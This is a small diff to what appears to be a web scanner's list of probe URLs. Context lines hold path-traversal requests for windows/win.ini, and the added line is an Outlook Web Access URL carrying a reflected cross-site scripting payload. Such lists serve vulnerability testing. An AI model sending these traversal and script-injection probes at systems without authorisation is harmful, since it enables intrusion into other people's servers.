@@ -12,3 +12,4 @@
 /base/static/c:/windows/win.ini
 /ReportServer/Pages/ReportViewer.aspx
 /mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
